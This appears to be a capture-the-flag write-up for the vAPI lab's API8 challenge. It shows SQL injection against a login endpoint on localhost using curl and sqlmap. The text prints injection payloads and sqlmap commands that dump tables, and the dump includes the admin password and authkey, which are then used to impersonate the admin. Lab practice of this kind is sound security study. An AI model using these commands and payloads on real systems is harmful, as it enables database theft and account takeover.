> I think you won't get credentials for this.You can try to login though.

# Tools Used:
```
curl 8.8.0 (x86_64-pc-linux-gnu)
sqlmap 1.8.6.3#dev
```

# User Login
## POST /vapi/api8/user/login

We do not have any credentials. Lets try a blank login
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\":\"\",\x0d\x0a    \"password\":\"\"\x0d\x0a}' \
    $'http://localhost/vapi/api8/user/login'
```
```http
HTTP/1.1 403 Forbidden
Host: localhost
Date: Sun, 30 Jun 2024 17:54:34 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 17:54:34 GMT
Content-Type: application/json

{"success":"false","cause":"IncorrectUsernameOrPassword"}
```

We could brute force possible credentials, but that may take a long time with no returns. We could also attempt injection.

Attempt a basic injection test of `'`
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\":\"\'\",\x0d\x0a    \"password\":\"\"\x0d\x0a}' \
    $'http://localhost/vapi/api8/user/login'
```
```http
HTTP/1.1 500 Internal Server Error
Host: localhost
Date: Sun, 30 Jun 2024 17:56:22 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 17:56:22 GMT
Content-Type: application/json

{"errorInfo":["42000",1064,"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' AND password='' limit 1' at line 1"]}
```
- Observe that the database type has been exposed as "MySQL"
- Observe that the SQL syntax error is shown to us in the response as "1064 mysql 42000"
	- The ERROR 1064 (42000) mainly occurs when the syntax is not set correctly


Use SQLmap to test for SQL injection vulnerablities
```
sqlmap "http://localhost/vapi/api8/user/login" --data="username=test1&password=test2" -p username --dbs
```
- `-p` specifies 'username' as the vulnerable parameter
- `--dbs` dumps names of the available databases, if any
```
        ___
       __H__                                                                                                                                                                                                                                                                            
 ___ ___[']_____ ___ ___  {1.8.6.3#dev}                                                                                                                                                                                                                                                 
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                                                               
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:13:29 /2024-06-30/

[14:13:29] [INFO] resuming back-end DBMS 'mysql' 
[14:13:29] [INFO] testing connection to the target URL
[14:13:29] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=test1' AND GTID_SUBSET(CONCAT(0x716b6b6b71,(SELECT (ELT(6285=6285,1))),0x716a7a6a71),6285)-- UPWT&password=test2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test1' AND (SELECT 8597 FROM (SELECT(SLEEP(5)))bVMV)-- Fdoy&password=test2

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=test1' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x67754b4c4f67766344637965545676576b666d4f7a4c634c5267467765614e5755436a6e55476c52,0x716a7a6a71)-- -&password=test2
---
[14:13:29] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33
back-end DBMS: MySQL >= 5.6
[14:13:29] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] vapi

[14:13:29] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 1 times
[14:13:29] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 14:13:29 /2024-06-30/
```
- Observe that 5 databases were found
	- information_schema
	- mysql
	- performance_schema
	- sys
	- vapi

Lets enumerate the vapi table since that seems interesting
```bash
sqlmap "http://localhost/vapi/api8/user/login" --data="username=test1&password=test2" -p username -D vapi --tables
```
```
        ___
       __H__                                                                                                                                                                                                                                                                            
 ___ ___[.]_____ ___ ___  {1.8.6.3#dev}                                                                                                                                                                                                                                                 
|_ -| . [']     | .'| . |                                                                                                                                                                                                                                                               
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:15:39 /2024-06-30/

[14:15:39] [INFO] resuming back-end DBMS 'mysql' 
[14:15:39] [INFO] testing connection to the target URL
[14:15:39] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=test1' AND GTID_SUBSET(CONCAT(0x716b6b6b71,(SELECT (ELT(6285=6285,1))),0x716a7a6a71),6285)-- UPWT&password=test2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test1' AND (SELECT 8597 FROM (SELECT(SLEEP(5)))bVMV)-- Fdoy&password=test2

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=test1' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x67754b4c4f67766344637965545676576b666d4f7a4c634c5267467765614e5755436a6e55476c52,0x716a7a6a71)-- -&password=test2
---
[14:15:39] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33
back-end DBMS: MySQL >= 5.6
[14:15:39] [INFO] fetching tables for database: 'vapi'
Database: vapi
[18 tables]
+------------------------+
| a_p_i1_users           |
| a_p_i2_users           |
| a_p_i3_comments        |
| a_p_i3_users           |
| a_p_i4_users           |
| a_p_i5_users           |
| a_p_i6_users           |
| a_p_i7_users           |
| a_p_i8_users           |
| a_p_i9_users           |
| failed_jobs            |
| flags                  |
| justweaktokens         |
| migrations             |
| password_resets        |
| personal_access_tokens |
| stickynotes            |
| users                  |
+------------------------+

[14:15:39] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 1 times
[14:15:39] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 14:15:39 /2024-06-30/
```
- Observe that the vapi tables has 18 tables:
	- a_p_i1_users
	- a_p_i2_users
	- a_p_i3_comments
	- a_p_i3_users
	- a_p_i4_users
	- a_p_i5_users
	- a_p_i6_users
	- a_p_i7_users
	- a_p_i8_users
	- a_p_i9_users
	- failed_jobs
	- flags
	- justweaktokens
	- migrations
	- password_resets
	- personal_access_tokens
	- stickynotes
	- users

The tables in the vapi database seems sorted by the tasks we are supposed to do. Lets dump out the data for that table.
```
sqlmap "http://localhost/vapi/api8/user/login" --data="username=test1&password=test2" -p username -D vapi -T a_p_i8_users --dump
```
```
        ___
       __H__                                                                                                                                                                                                                                                                            
 ___ ___[.]_____ ___ ___  {1.8.6.3#dev}                                                                                                                                                                                                                                                 
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                                                               
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:20:14 /2024-06-30/

[14:20:14] [INFO] resuming back-end DBMS 'mysql' 
[14:20:14] [INFO] testing connection to the target URL
[14:20:14] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=test1' AND GTID_SUBSET(CONCAT(0x716b6b6b71,(SELECT (ELT(6285=6285,1))),0x716a7a6a71),6285)-- UPWT&password=test2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test1' AND (SELECT 8597 FROM (SELECT(SLEEP(5)))bVMV)-- Fdoy&password=test2

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=test1' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x67754b4c4f67766344637965545676576b666d4f7a4c634c5267467765614e5755436a6e55476c52,0x716a7a6a71)-- -&password=test2
---
[14:20:14] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33
back-end DBMS: MySQL >= 5.6
[14:20:14] [INFO] fetching columns for table 'a_p_i8_users' in database 'vapi'
[14:20:14] [INFO] fetching entries for table 'a_p_i8_users' in database 'vapi'
Database: vapi
Table: a_p_i8_users
[1 entry]
+----+---------------------------------+----------------------------------+------------------+----------+
| id | secret                          | authkey                          | password         | username |
+----+---------------------------------+----------------------------------+------------------+----------+
| 1  | flag{api8_509f8e201807860d5c91} | oWsZ8vWNuECjCAiZVJHOzsNsNH08zWRZ | z2Eav@j6A:^}fSMe | admin    |
+----+---------------------------------+----------------------------------+------------------+----------+

[14:20:14] [INFO] table 'vapi.a_p_i8_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/vapi/a_p_i8_users.csv'
[14:20:14] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 1 times
[14:20:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 14:20:14 /2024-06-30/
```
- Observe we are able to see the data of the table, and it contains the authentication key for the admin user (and also the flag for the task)

Admin Authentication Key:
```
oWsZ8vWNuECjCAiZVJHOzsNsNH08zWRZ
```
- We will need the Authentication Key for the "Get Secret" endpoint

# Get Secret
## GET /vapi/api8/user/secret

As specified in the Postman Collection, the test script to be executed for the API8 User Login is used to derive the token (Authorization-Token) by parsing the response JSON data, taking the values of the "authkey" key, and updates it in the Postman Environment as api8_auth.
```js
var jsonData = JSON.parse(responseBody);
var api8_auth = jsonData.authkey;
console.log("API 8 Auth : "+api8_auth);
postman.setEnvironmentVariable("api8_auth",api8_auth);
```

Since we already found the authentication key (authkey) using SQL injection, we can proceed to impersonate the admin user and get the secret.
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: oWsZ8vWNuECjCAiZVJHOzsNsNH08zWRZ' -H $'Host: localhost' \
    $'http://localhost/vapi/api8/user/secret'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 18:28:28 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 18:28:28 GMT
Content-Type: application/json

{"id":1,"username":"admin","secret":"flag{api8_509f8e201807860d5c91}"}
```

API8 Flag
```
flag{api8_509f8e201807860d5c91}
```

# Additional information

## Entire vAPI Database
Sidenote, using this command was too successful.
```bash
sqlmap "http://localhost/vapi/api8/user/login" --data="username=test1&password=test2" --level 5 --risk 3 --dump --batch
```

References:
https://owasp.org/API-Security/editions/2019/en/0xa8-injection/